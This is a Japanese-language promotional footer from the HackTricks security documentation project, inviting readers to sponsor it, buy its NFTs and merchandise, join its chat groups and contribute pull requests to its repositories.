* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
